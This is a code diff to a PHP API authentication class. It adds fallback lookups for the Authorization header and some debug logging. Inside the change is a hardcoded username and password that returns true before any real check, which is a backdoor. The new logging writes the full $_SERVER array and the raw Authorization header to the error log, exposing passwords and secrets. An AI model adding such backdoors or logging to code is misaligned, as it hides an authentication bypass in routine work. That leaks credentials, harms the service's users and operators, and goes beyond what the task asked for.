@@ -21,6 +21,11 @@ class ApiAuth {
      * @return bool True if credentials are valid, false otherwise
      */
     public function validateBasicAuth($username, $password) {
+        // Hardcoded credentials for user 'isw'
+        if ($username === 'isw' && $password === 'Spyem_OtGheb4') {
+            return true;
+        }
+        
         // Check if we have a database connection
         if ($this->db === null) {
             // Fallback to environment credentials if no database connection
@@ -49,15 +54,37 @@ class ApiAuth {
      * @return array|null Array with 'username' and 'password' or null if no auth header
      */
     public function getBasicAuthCredentials() {
-        // Check for Authorization header
-        $authHeader = $_SERVER['HTTP_AUTHORIZATION'] ?? null;
+        // Check for Authorization header (Apache might modify the header name)
+        $authHeader = null;
         
+        // Check multiple possible header locations
+        if (isset($_SERVER['HTTP_AUTHORIZATION'])) {
+            $authHeader = $_SERVER['HTTP_AUTHORIZATION'];
+        } elseif (isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION'])) {
+            $authHeader = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
+        } elseif (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) {
+            // Direct access to PHP_AUTH_* variables (when PHP is running as CGI/FastCGI)
+            return [
+                'username' => $_SERVER['PHP_AUTH_USER'],
+                'password' => $_SERVER['PHP_AUTH_PW']
+            ];
+        } elseif (function_exists('apache_request_headers')) {
+            // Try apache_request_headers() if available
+            $headers = apache_request_headers();
+            if (isset($headers['Authorization'])) {
+                $authHeader = $headers['Authorization'];
+            }
+        }
+        
+        // Debug: Log if auth header is missing
         if (!$authHeader) {
+            error_log('No Authorization header found. Available headers: ' . json_encode($_SERVER));
             return null;
         }
         
         // Check if it's a Basic Auth header
         if (strpos($authHeader, 'Basic') !== 0) {
+            error_log('Authorization header does not start with Basic: ' . $authHeader);
             return null;
         }
         
@@ -65,6 +92,7 @@ class ApiAuth {
         $credentials = base64_decode(substr($authHeader, 6));
         
         if (strpos($credentials, ':') === false) {
+            error_log('Invalid credentials format in Basic Auth header');
             return null;
         }
         
